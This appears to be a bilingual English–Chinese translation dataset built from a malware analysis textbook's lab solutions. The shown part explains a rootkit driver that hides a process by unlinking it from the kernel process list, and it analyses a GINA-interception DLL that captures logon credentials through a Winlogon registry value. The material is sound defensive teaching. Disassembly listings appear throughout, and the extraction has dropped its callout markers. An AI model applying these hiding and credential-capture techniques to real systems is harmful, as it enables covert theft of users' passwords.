  zh: nt!IopInvalidDeviceRequest = <no type information> 0X804F354A处的函数名为IopInvalidDeviceRequest，它表示处理该驱动程序不处理的无效请求。主函数表偏移量0、2和0xe处的其余函数包含我们感兴趣的功能。检查*wdm.h*，我们发现偏移量0、2和0xe存储了Create、Close和DeviceIoControl函数的函数。
- en: First, we look at the Create and Close functions at offsets 0 and 2 in the major
    function table. We notice that both entries in the major function table point
    to the same function (0xF7C26606). Looking at that function, we see that it simply
    calls IofCompleteRequest and then returns. This tells the OS that the request
    was successful, but does nothing else. The only remaining function in the major
    function table is the one that handles DeviceIoControl requests, which is the
    most interesting.
  id: totrans-2917
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，我们查看主函数表偏移量0和2处的Create和Close函数。我们注意到主函数表中的两个条目都指向同一个函数（0xF7C26606）。查看该函数，我们看到它只是调用IofCompleteRequest然后返回。这告诉操作系统请求已成功，但没有做其他任何事情。主函数表中剩下的唯一函数是处理DeviceIoControl请求的函数，这是最有趣的。
- en: Looking at the DeviceIoControl function, we see that it manipulates the PEB
    of the current process. Listing 10-19L shows the code that handles DeviceIoControl.
  id: totrans-2918
  prefs: []
  type: TYPE_NORMAL
  zh: 查看DeviceIoControl函数，我们看到它操作当前进程的PEB。Listing 10-19L显示了处理DeviceIoControl的代码。
- en: 00010666 mov edi, edi
  id: totrans-2919
  prefs: []
  type: TYPE_NORMAL
  zh: 00010666 mov edi, edi
- en: 00010668 push ebp
  id: totrans-2920
  prefs: []
  type: TYPE_NORMAL
  zh: 00010668 push ebp
- en: 00010669 mov ebp, esp
  id: totrans-2921
  prefs: []
  type: TYPE_NORMAL
  zh: 00010669 mov ebp, esp
- en: '**564**'
  id: totrans-2922
  prefs: []
  type: TYPE_NORMAL
  zh: '**564**'
- en: Appendix C
  id: totrans-2923
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2924
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 0001066B call ds:IoGetCurrentProcess 00010671 mov ecx, [eax+8Ch]
  id: totrans-2925
  prefs: []
  type: TYPE_NORMAL
  zh: 0001066B call ds:IoGetCurrentProcess 00010671 mov ecx, [eax+8Ch]
- en: 00010677 add eax, 88h
  id: totrans-2926
  prefs: []
  type: TYPE_NORMAL
  zh: 00010677 add eax, 88h
- en: 0001067C mov edx, [eax]
  id: totrans-2927
  prefs: []
  type: TYPE_NORMAL
  zh: 0001067C mov edx, [eax]
- en: 0001067E mov [ecx], edx
  id: totrans-2928
  prefs: []
  type: TYPE_NORMAL
  zh: 0001067E mov [ecx], edx
- en: 00010680 mov ecx, [eax]
  id: totrans-2929
  prefs: []
  type: TYPE_NORMAL
  zh: 00010680 mov ecx, [eax]
- en: 00010682 mov eax, [eax+4]
  id: totrans-2930
  prefs: []
  type: TYPE_NORMAL
  zh: 00010682 mov eax, [eax+4]
- en: 00010685 mov [ecx+4], eax
  id: totrans-2931
  prefs: []
  type: TYPE_NORMAL
  zh: 00010685 mov [ecx+4], eax
- en: 00010688 mov ecx, [ebp+Irp] ; Irp
  id: totrans-2932
  prefs: []
  type: TYPE_NORMAL
  zh: 00010688 mov ecx, [ebp+Irp] ; Irp
- en: 0001068B and dword ptr [ecx+18h], 0
  id: totrans-2933
  prefs: []
  type: TYPE_NORMAL
  zh: 0001068B and dword ptr [ecx+18h], 0
- en: 0001068F and dword ptr [ecx+1Ch], 0
  id: totrans-2934
  prefs: []
  type: TYPE_NORMAL
  zh: 0001068F and dword ptr [ecx+1Ch], 0
- en: 00010693 xor dl, dl ; PriorityBoost 00010695 call ds:IofCompleteRequest
  id: totrans-2935
  prefs: []
  type: TYPE_NORMAL
  zh: 00010693 xor dl, dl ; PriorityBoost 00010695 call ds:IofCompleteRequest
- en: 0001069B xor eax, eax
  id: totrans-2936
  prefs: []
  type: TYPE_NORMAL
  zh: 0001069B xor eax, eax
- en: 0001069D pop ebp
  id: totrans-2937
  prefs: []
  type: TYPE_NORMAL
  zh: 0001069D pop ebp
- en: 0001069E retn 8
  id: totrans-2938
  prefs: []
  type: TYPE_NORMAL
  zh: 0001069E retn 8
- en: '*Listing 10-19L: The driver code that handles DeviceIoControl requests* The
    first thing the DeviceIoControl function does is call IoGetCurrentProcess **10**'
  id: totrans-2939
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 10-19L: 处理DeviceIoControl请求的驱动代码* DeviceIoControl函数首先调用IoGetCurrentProcess
    **10**'
- en: at , which returns the EPROCESS structure of the process that issued the call
    to DeviceIoControl. The function then accesses the data at an offset of 0x88
  id: totrans-2940
  prefs: []
  type: TYPE_NORMAL
  zh: at ，它返回发出DeviceIoControl调用的进程的EPROCESS结构。然后函数访问偏移量为0x88的数据。
- en: at , and then accesses the next DWORD at offset 0x8C at .
  id: totrans-2941
  prefs: []
  type: TYPE_NORMAL
  zh: at ，然后访问偏移量0x8C处的下一个DWORD。
- en: We use the dt command to discover that LIST_ENTRY is stored at offsets 0x88
    and 0x8C in the PEB structure, as shown in Listing 10-20L at .
  id: totrans-2942
  prefs: []
  type: TYPE_NORMAL
  zh: 我们使用dt命令发现，LIST_ENTRY在PEB结构中存储在偏移量0x88和0x8C处，如Listing 10-20L所示。
- en: kd> **dt nt!_EPROCESS**
  id: totrans-2943
  prefs: []
  type: TYPE_NORMAL
  zh: kd> **dt nt!_EPROCESS**
- en: '+0x000 Pcb : _KPROCESS'
  id: totrans-2944
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x000 Pcb : _KPROCESS'
- en: '+0x06c ProcessLock : _EX_PUSH_LOCK'
  id: totrans-2945
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x06c ProcessLock : _EX_PUSH_LOCK'
- en: '+0x070 CreateTime : _LARGE_INTEGER'
  id: totrans-2946
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x070 CreateTime : _LARGE_INTEGER'
- en: '+0x078 ExitTime : _LARGE_INTEGER'
  id: totrans-2947
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x078 ExitTime : _LARGE_INTEGER'
- en: '+0x080 RundownProtect : _EX_RUNDOWN_REF'
  id: totrans-2948
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x080 RundownProtect : _EX_RUNDOWN_REF'
- en: '+0x084 UniqueProcessId : Ptr32 Void'
  id: totrans-2949
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x084 UniqueProcessId : Ptr32 Void'
- en: '+0x088 ActiveProcessLinks : _LIST_ENTRY'
  id: totrans-2950
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x088 ActiveProcessLinks : _LIST_ENTRY'
- en: '+0x090 QuotaUsage : [3] Uint4B'
  id: totrans-2951
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x090 QuotaUsage : [3] Uint4B'
- en: '+0x09c QuotaPeak : [3] Uint4B'
  id: totrans-2952
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x09c QuotaPeak : [3] Uint4B'
- en: '...'
  id: totrans-2953
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: '*Listing 10-20L: Examining the EPROCESS structure with WinDbg* Now that we
    know that function is accessing the LIST_ENTRY structure, we look closely at how
    LIST_ENTRY is being accessed. The LIST_ENTRY structure is a double-linked list
    with two values: the first is BLINK, which points to the previous entry in the
    list, and the second is FLINK, which points to the next entry in the list. We
    see that it is not only reading the LIST_ENTRY structure, but also changing structures,
    as shown in Listing 10-21L.'
  id: totrans-2954
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表10-20L：使用WinDbg检查EPROCESS结构* 现在我们知道该函数正在访问LIST_ENTRY结构，我们仔细观察LIST_ENTRY是如何被访问的。LIST_ENTRY结构是一个双链表，包含两个值：第一个是BLINK，它指向列表中的前一个条目，第二个是FLINK，它指向列表中的下一个条目。我们看到它不仅读取LIST_ENTRY结构，而且还修改结构，如列表10-21L所示。'
- en: '00010671'
  id: totrans-2955
  prefs: []
  type: TYPE_NORMAL
  zh: '00010671'
- en: mov ecx, [eax+8Ch]
  id: totrans-2956
  prefs: []
  type: TYPE_NORMAL
  zh: mov ecx, [eax+8Ch]
- en: 00010677 add eax, 88h
  id: totrans-2957
  prefs: []
  type: TYPE_NORMAL
  zh: 00010677 add eax, 88h
- en: 0001067C
  id: totrans-2958
  prefs: []
  type: TYPE_NORMAL
  zh: 0001067C
- en: mov edx, [eax]
  id: totrans-2959
  prefs: []
  type: TYPE_NORMAL
  zh: mov edx, [eax]
- en: 0001067E
  id: totrans-2960
  prefs: []
  type: TYPE_NORMAL
  zh: 0001067E
- en: mov [ecx], edx
  id: totrans-2961
  prefs: []
  type: TYPE_NORMAL
  zh: mov [ecx], edx
- en: 00010680
  id: totrans-2962
  prefs: []
  type: TYPE_NORMAL
  zh: 00010680
- en: mov ecx, [eax]
  id: totrans-2963
  prefs: []
  type: TYPE_NORMAL
  zh: mov ecx, [eax]
- en: Solutions to Labs
  id: totrans-2964
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**565**'
  id: totrans-2965
  prefs: []
  type: TYPE_NORMAL
  zh: '**565**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2966
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 00010682
  id: totrans-2967
  prefs: []
  type: TYPE_NORMAL
  zh: 00010682
- en: mov eax, [eax+4]
  id: totrans-2968
  prefs: []
  type: TYPE_NORMAL
  zh: mov eax, [eax+4]
- en: 00010685
  id: totrans-2969
  prefs: []
  type: TYPE_NORMAL
  zh: 00010685
- en: mov [ecx+4], eax
  id: totrans-2970
  prefs: []
  type: TYPE_NORMAL
  zh: mov [ecx+4], eax
- en: '*Listing 10-21L: DeviceIoControl code that modifies the EPROCESS structure*
    The instruction at  obtains a pointer to the next entry in the list. The instruction
    at  obtains a pointer to the previous entry in the list. The instruction at 
    overwrites the BLINK pointer of the next entry so that it points to the previous
    entry. Prior to , the BLINK pointer of the next entry pointed to the current
    entry. The instruction at  overwrites the BLINK pointer so that it skips over
    the current process. The instructions at , , and  perform the same steps, except
    to overwrite the FLINK pointer of the previous entry in the list to skip the current
    entry.'
  id: totrans-2971
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表10-21L：修改EPROCESS结构的DeviceIoControl代码* 指令获取列表中下一个条目的指针。指令获取列表中前一个条目的指针。指令覆盖下一个条目的BLINK指针，使其指向前一个条目。在之前，下一个条目的BLINK指针指向当前条目。指令覆盖BLINK指针，使其跳过当前进程。指令、和执行相同的步骤，只是覆盖列表中前一个条目的FLINK指针以跳过当前进程。'
- en: Rather than change the EPROCESS structure of the current process, the code in
    Listing 10-21L changes the EPROCESS structure of the process in front of it and
    behind it in the linked list of processes. These six instructions hide the current
    process by unlinking it from the linked list of loaded processes, as shown in
    Figure 10-3L.
  id: totrans-2972
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10-21L中的代码不是改变当前进程的EPROCESS结构，而是改变链表中当前进程前后进程的EPROCESS结构。这六个指令通过从已加载进程的链表中取消链接当前进程来隐藏当前进程，如图10-3L所示。
- en: Process 1
  id: totrans-2973
  prefs: []
  type: TYPE_NORMAL
  zh: 进程1
- en: Process 2
  id: totrans-2974
  prefs: []
  type: TYPE_NORMAL
  zh: 进程2
- en: Process 3
  id: totrans-2975
  prefs: []
  type: TYPE_NORMAL
  zh: 进程3
- en: Process 4
  id: totrans-2976
  prefs: []
  type: TYPE_NORMAL
  zh: 进程4
- en: '...'
  id: totrans-2977
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: '...'
  id: totrans-2978
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: LIST_ENTRY
  id: totrans-2979
  prefs: []
  type: TYPE_NORMAL
  zh: LIST_ENTRY
- en: LIST_ENTRY
  id: totrans-2980
  prefs: []
  type: TYPE_NORMAL
  zh: LIST_ENTRY
- en: LIST_ENTRY
  id: totrans-2981
  prefs: []
  type: TYPE_NORMAL
  zh: LIST_ENTRY
- en: LIST_ENTRY
  id: totrans-2982
  prefs: []
  type: TYPE_NORMAL
  zh: LIST_ENTRY
- en: '*Figure 10-3L: A process being removed from the process list so that it’s hidden
    from tools* *such as Task Manager*'
  id: totrans-2983
  prefs: []
  type: TYPE_NORMAL
  zh: '*图10-3L：从进程列表中移除进程以便从工具* *如任务管理器* *中隐藏*'
- en: When the OS is running normally, each process has a pointer to the process before
    and after it. However, in Figure 10-3L, Process 2 has been hidden by this rootkit.
    When the OS iterates over the linked list of processes, the hidden process is
    always skipped.
  id: totrans-2984
  prefs: []
  type: TYPE_NORMAL
  zh: 当操作系统正常运行时，每个进程都有一个指向其前后进程的指针。然而，在图10-3L中，进程2已被这个rootkit隐藏。当操作系统遍历进程的链表时，隐藏的进程总是被跳过。
- en: You might wonder how this process continues to run without any problems, even
    though it’s not in the OS’s list of processes. To answer this, remember that a
    process is simply a container for various threads to run inside. The threads are
    scheduled to execute on the CPU. As long as the threads are still properly accounted
    for by the OS, they will be scheduled, and the process will continue to run as
    normal.
  id: totrans-2985
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能会想知道这个进程是如何在没有问题的情况下继续运行的，尽管它不在操作系统的进程列表中。为了回答这个问题，请记住，进程只是各种线程在内部运行的容器。线程被调度在CPU上执行。只要线程仍然被操作系统正确地计入，它们就会被调度，进程将继续正常运行。
- en: '**Lab 11-1 Solutions**'
  id: totrans-2986
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验11-1解决方案**'
- en: '***Short Answers***'
  id: totrans-2987
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-2988
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The malware extracts and drops the file *msgina32.dll* onto disk from a resource
    section named TGAD.
  id: totrans-2989
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件从名为TGAD的资源部分提取并将文件*msgina32.dll*放置在磁盘上。
- en: 2\.
  id: totrans-2990
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: The malware installs *msgina32.dll* as a GINA DLL by adding it to the registry
    location HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ GinaDLL,
    which causes the DLL to be loaded after system reboot.
  id: totrans-2991
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件通过将其添加到注册表位置HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
    GinaDLL中，将*msgina32.dll*作为GINA DLL安装，导致系统重启后加载该DLL。
- en: '**566**'
  id: totrans-2992
  prefs: []
  type: TYPE_NORMAL
  zh: '**566**'
- en: Appendix C
  id: totrans-2993
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2994
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 125](index-600_1.png)'
  id: totrans-2995
  prefs: []
  type: TYPE_IMG
  zh: '![Image 125](index-600_1.png)'
- en: 3\.
  id: totrans-2996
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The malware steals user credentials by performing GINA interception. The *msgina32.dll*
    file is able to intercept all user credentials submitted to the system for authentication.
  id: totrans-2997
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件通过执行 GINA 侦听来窃取用户凭证。*msgina32.dll* 文件能够拦截提交给系统进行身份验证的所有用户凭证。
- en: 4\.
  id: totrans-2998
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The malware logs stolen credentials to *%SystemRoot%\System32\* *msutil32.sys*.
    The username, domain, and password are logged to the file with a timestamp.
  id: totrans-2999
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件将窃取的凭证记录到 *%SystemRoot%\System32\* *msutil32.sys* 文件中。用户名、域和密码以时间戳的形式记录到文件中。
- en: 5\.
  id: totrans-3000
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: Once the malware is dropped and installed, there must be a system reboot for
    the GINA interception to begin. The malware logs credentials only when the user
    logs out, so log out and back in to see your credentials in the log file.
  id: totrans-3001
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦恶意软件被部署并安装，必须重启系统才能开始 GINA 侦听。恶意软件仅在用户注销时记录凭证，因此请注销并重新登录以查看日志文件中的凭证。
- en: '***Detailed Analysis***'
  id: totrans-3002
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: Beginning with basic static analysis, we see the strings GinaDLL and SOFTWARE\
    Microsoft\Windows NT\CurrentVersion\Winlogon, which lead us to suspect that this
    might be GINA interception malware. Examining the imports, we see functions for
    manipulating the registry and extracting a resource section. Because we see resource
    extraction import functions, we examine the file structure by loading *Lab11-01.exe*
    into PEview, as shown in Figure 11-1L.
  id: totrans-3003
  prefs: []
  type: TYPE_NORMAL
  zh: 从基本的静态分析开始，我们看到字符串 GinaDLL 和 SOFTWARE\ Microsoft\Windows NT\CurrentVersion\Winlogon，这使我们怀疑这可能是
    GINA 侦听恶意软件。检查导入项，我们看到用于操作注册表和提取资源部分的函数。因为我们看到了资源提取导入函数，所以我们通过将 *Lab11-01.exe*
    加载到 PEview 中来检查文件结构，如图 11-1L 所示。
- en: '**1 1**'
  id: totrans-3004
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 1**'
- en: '*Figure 11-1L:* Lab11-01.exe *in PEview showing the TGAD resource section*
    Examining the PE file format, we see a resource section named TGAD.'
  id: totrans-3005
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-1L:* Lab11-01.exe 在 PEview 中显示的 TGAD 资源部分* 检查 PE 文件格式，我们看到一个名为 TGAD 的资源部分。'
- en: When we click that section in PEview, we see that TGAD contains an embedded
    PE file.
  id: totrans-3006
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们在 PEview 中单击该部分时，我们看到 TGAD 包含一个嵌入的 PE 文件。
- en: Next, we perform dynamic analysis and monitor the malware with procmon by setting
    a filter for *Lab11-01.exe*. When we launch the malware, we see that it creates
    a file named *msgina32.dll* on disk in the same directory from which the malware
    was launched. The malware inserts the path to *msgina32.dll* into the registry
    key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\ GinaDLL, so that
    the DLL will be loaded by Winlogon when the system reboots.
  id: totrans-3007
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们执行动态分析，并通过为 *Lab11-01.exe* 设置过滤器来使用 procmon 监控恶意软件。当我们启动恶意软件时，我们看到它在恶意软件启动的同一目录的磁盘上创建了一个名为
    *msgina32.dll* 的文件。恶意软件将 *msgina32.dll* 的路径插入到注册表键 HKLM\SOFTWARE\Microsoft\Windows
    NT\CurrentVersion\Winlogon\GinaDLL 中，这样当系统重启时，Winlogon 将加载该 DLL。
- en: Extracting the TGAD resource section from *Lab11-01.exe* (using Resource Hacker)
    and comparing it to *msgina32.dll*, we find that the two are identical.
  id: totrans-3008
  prefs: []
  type: TYPE_NORMAL
  zh: 从 *Lab11-01.exe* 中提取 TGAD 资源部分（使用 Resource Hacker）并将其与 *msgina32.dll* 进行比较，我们发现两者是相同的。
- en: 'Next, we load *Lab11-01.exe* into IDA Pro to confirm our findings. We see that
    the main function calls two functions: sub_401080 (extracts the TGAD resource
    section to *msgina32.dll*) and sub_401000 (sets the GINA registry value). We Solutions
    to Labs'
  id: totrans-3009
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将 *Lab11-01.exe* 文件加载到 IDA Pro 中以确认我们的发现。我们看到主函数调用了两个函数：sub_401080（将 TGAD
    资源部分提取到 *msgina32.dll*）和 sub_401000（设置 GINA 注册表值）。我们解决方案到实验室
- en: '**567**'
  id: totrans-3010
  prefs: []
  type: TYPE_NORMAL
  zh: '**567**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3011
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: conclude that *Lab11-01.exe* is an installer for *msgina32.dll*, which is loaded
    by Winlogon during system startup.
  id: totrans-3012
  prefs: []
  type: TYPE_NORMAL
  zh: 我们得出结论，*Lab11-01.exe* 是 *msgina32.dll* 的安装程序，该程序在系统启动时由 Winlogon 加载。
- en: '**Analysis of msgina32.dll**'
  id: totrans-3013
  prefs: []
  type: TYPE_NORMAL
  zh: '**msgina32.dll 分析**'
- en: We’ll begin our analysis of *msgina32.dll* by looking at the Strings output,
    as shown in Listing 11-1L.
  id: totrans-3014
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将开始对 *msgina32.dll* 的分析，查看列表 11-1L 中的字符串输出。
- en: GinaDLL
  id: totrans-3015
  prefs: []
  type: TYPE_NORMAL
  zh: GinaDLL
- en: Software\Microsoft\Windows NT\CurrentVersion\Winlogon
  id: totrans-3016
  prefs: []
  type: TYPE_NORMAL
  zh: Software\Microsoft\Windows NT\CurrentVersion\Winlogon
- en: MSGina.dll
  id: totrans-3017
  prefs: []
  type: TYPE_NORMAL
  zh: MSGina.dll
- en: UN %s DM %s PW %s OLD %s 
  id: totrans-3018
  prefs: []
  type: TYPE_NORMAL
  zh: UN %s DM %s PW %s OLD %s 
- en: msutil32.sys
  id: totrans-3019
  prefs: []
  type: TYPE_NORMAL
  zh: msutil32.sys
- en: '*Listing 11-1L: Strings output of* msgina32.dll'
  id: totrans-3020
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-1L:* msgina32.dll 的字符串输出'
- en: The strings in this listing contain what appears to be a log message at , which
    could be used to log user credentials if this is GINA interception malware. The
    string msutil32.sys is interesting, and we will determine its significance later
    in the lab.
  id: totrans-3021
  prefs: []
  type: TYPE_NORMAL
  zh: 此列表中的字符串似乎包含一个日志消息在，如果这是 GINA 侦听恶意软件，则可以用来记录用户凭证。字符串 msutil32.sys 很有趣，我们将在实验的后面确定其重要性。
- en: Examining *msgina32.dll*’s exports, we see many functions that begin with the
    prefix Wlx. Recall from Chapter 11 that GINA interception malware must contain
    all of these DLL exports because they are required by GINA. We’ll analyze each
    of these functions in IDA Pro.
  id: totrans-3022
  prefs: []
  type: TYPE_NORMAL
  zh: 检查*msgina32.dll*的导出，我们看到许多以Wlx为前缀的函数。回想第11章，GINA拦截恶意软件必须包含所有这些DLL导出，因为它们是GINA所必需的。我们将在IDA
    Pro中分析这些函数中的每一个。
- en: We begin by loading the malware into IDA Pro and analyzing DllMain, as shown
    in Listing 11-2L.
  id: totrans-3023
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先将恶意软件加载到IDA Pro中，并分析DllMain，如列表11-2L所示。
- en: 1000105A cmp eax, DLL_PROCESS_ATTACH 
  id: totrans-3024
  prefs: []
  type: TYPE_NORMAL
  zh: 1000105A cmp eax, DLL_PROCESS_ATTACH 
- en: 1000105D jnz short loc_100010B7
  id: totrans-3025
  prefs: []
  type: TYPE_NORMAL
  zh: 1000105D jnz short loc_100010B7
- en: '...'
  id: totrans-3026
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 1000107E call ds:GetSystemDirectoryW 
  id: totrans-3027
  prefs: []
  type: TYPE_NORMAL
  zh: 1000107E call ds:GetSystemDirectoryW 
- en: 10001084 lea ecx, [esp+20Ch+LibFileName]
  id: totrans-3028
  prefs: []
  type: TYPE_NORMAL
  zh: 10001084 lea ecx, [esp+20Ch+LibFileName]
- en: 10001088 push offset String2 ; "\\MSGina"
  id: totrans-3029
  prefs: []
  type: TYPE_NORMAL
  zh: 10001088 push offset String2 ; "\\MSGina"
- en: 1000108D push ecx ; lpString1
  id: totrans-3030
  prefs: []
  type: TYPE_NORMAL
  zh: 1000108D push ecx ; lpString1
- en: 1000108E call ds:lstrcatW
  id: totrans-3031
  prefs: []
  type: TYPE_NORMAL
  zh: 1000108E call ds:lstrcatW
- en: 10001094 lea edx, [esp+20Ch+LibFileName]
  id: totrans-3032
  prefs: []
  type: TYPE_NORMAL
  zh: 10001094 lea edx, [esp+20Ch+LibFileName]
- en: 10001098 push edx ; lpLibFileName 10001099 call ds:LoadLibraryW 
  id: totrans-3033
  prefs: []
  type: TYPE_NORMAL
  zh: 10001098 push edx ; lpLibFileName 10001099 call ds:LoadLibraryW 
- en: 1000109F xor ecx, ecx
  id: totrans-3034
  prefs: []
  type: TYPE_NORMAL
  zh: 1000109F xor ecx, ecx
- en: 100010A1 mov hModule, eax 
  id: totrans-3035
  prefs: []
  type: TYPE_NORMAL
  zh: 100010A1 mov hModule, eax 
- en: '*Listing 11-2L: DllMain of* msgina32.dll *getting a handle to* msgina.dll As
    shown in the Listing 11-2L, DllMain first checks the fdwReason argument at .
    This is an argument passed in to indicate why the DLL entry-point function is
    being called. The malware checks for DLL_PROCESS_ATTACH, which is called when
    a process is starting up or when LoadLibrary is used to load the DLL. If this
    particular DllMain is called during a DLL_PROCESS_ATTACH, the code beginning at
     is called. This code gets a handle to *msgina.dll* in the Windows system directory
    via the call to LoadLibraryW at .'
  id: totrans-3036
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表11-2L: msgina32.dll的DllMain获取msgina.dll的句柄* 如列表11-2L所示，DllMain首先检查处的fdwReason参数。这是一个传入的参数，用于指示DLL入口点函数被调用的原因。恶意软件检查DLL_PROCESS_ATTACH，当进程启动或使用LoadLibrary加载DLL时被调用。如果这个特定的DllMain在DLL_PROCESS_ATTACH期间被调用，则从开始执行代码。此代码通过在处调用LoadLibraryW获取Windows系统目录中的*msgina.dll*的句柄。'
- en: '**568**'
  id: totrans-3037
  prefs: []
  type: TYPE_NORMAL
  zh: '**568**'
- en: Appendix C
  id: totrans-3038
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3039
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**NOTE**'
  id: totrans-3040
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: msgina.dll *is the Windows DLL that implements GINA, whereas* msgina32.dll *is
    the* *malware author’s GINA interception DLL. The name* msgina32 *is designed
    to deceive.*
  id: totrans-3041
  prefs: []
  type: TYPE_NORMAL
  zh: msgina.dll *是实现GINA的Windows DLL，而* msgina32.dll *是恶意软件作者的GINA拦截DLL。* msgina32
    *的名称设计用来欺骗。
- en: The malware saves the handle in a global variable that IDA Pro has named hModule
    at . The use of this variable allows the DLL’s exports to properly call functions
    in the *msgina.dll* Windows DLL. Since *msgina32.dll* is intercepting communication
    between Winlogon and *msgina.dll*, it must properly call the functions in *msgina.dll*
    so that the system will continue to operate normally.
  id: totrans-3042
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件将句柄保存在IDA Pro命名为hModule的全局变量中。使用此变量允许DLL的导出正确调用*msgina.dll* Windows DLL中的函数。由于*msgina32.dll*正在拦截Winlogon和*msgina.dll*之间的通信，它必须正确调用*msgina.dll*中的函数，以便系统继续正常运行。
- en: Next, we analyze each export function. We begin with WlxLoggedOnSAS, as shown
    in Listing 11-3L.
  id: totrans-3043
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们分析每个导出函数。我们从WlxLoggedOnSAS开始，如列表11-3L所示。
- en: 10001350 WlxLoggedOnSAS proc near
  id: totrans-3044
  prefs: []
  type: TYPE_NORMAL
  zh: 10001350 WlxLoggedOnSAS proc near
- en: 10001350 push offset aWlxloggedons_0 ; "WlxLoggedOnSAS"
  id: totrans-3045
  prefs: []
  type: TYPE_NORMAL
  zh: 10001350 push offset aWlxloggedons_0 ; "WlxLoggedOnSAS"
- en: 10001355 call sub_10001000
  id: totrans-3046
  prefs: []
  type: TYPE_NORMAL
  zh: 10001355 call sub_10001000
- en: 1000135A jmp eax 
  id: totrans-3047
  prefs: []
  type: TYPE_NORMAL
  zh: 1000135A jmp eax 
- en: '*Listing 11-3L: WlxLoggedOnSAS export just passing through to* msgina.dll The
    WlxLoggedOnSAS export is short and simply passes through to the true WlxLoggedOnSAS
    contained in *msgina.dll*. There are now two WlxLoggedOnSAS functions: the version
    in Listing 11-3L in *msgina32.dll* and the original in *msgina.dll*.'
  id: totrans-3048
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表11-3L: WlxLoggedOnSAS导出仅通过msgina.dll转发* The WlxLoggedOnSAS导出简短且仅通过msgina.dll转发到包含在*msgina.dll*中的真实WlxLoggedOnSAS。现在有两个WlxLoggedOnSAS函数：*msgina32.dll*中的列表11-3L版本和*msgina.dll*中的原始版本。'
- en: '**1 1**'
  id: totrans-3049
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 1**'
- en: The function in Listing 11-3L begins by passing the string WlxLoggedOnSAS to
    sub_10001000 and then jumps to the result. The sub_10001000 function uses the
    hModule handle (to *msgina.dll*) and the string passed in (in this case, WlxLoggedOnSAS)
    to use GetProcAddress to resolve a function in *msgina.dll*.
  id: totrans-3050
  prefs: []
  type: TYPE_NORMAL
  zh: 列表11-3L中的函数首先将字符串WlxLoggedOnSAS传递给sub_10001000，然后跳转到结果。sub_10001000函数使用hModule句柄（指向*msgina.dll*）和传递的字符串（在本例中为WlxLoggedOnSAS）来使用GetProcAddress解析*msgina.dll*中的函数。
- en: The malware doesn’t call the function; it simply resolves the address of WlxLoggedOnSAS
    in *msgina.dll* and jumps to the function, as seen at . By jumping and not calling
    WlxLoggedOnSAS, this code will not set up a stack frame or push a return address
    onto the stack. When WlxLoggedOnSAS in *msgina.dll* is called, it will return
    execution directly to Winlogon because the return address on the stack is the
    same as what was on the stack when the code in Listing 11-3L is called.
  id: totrans-3051
  prefs: []
  type: TYPE_NORMAL
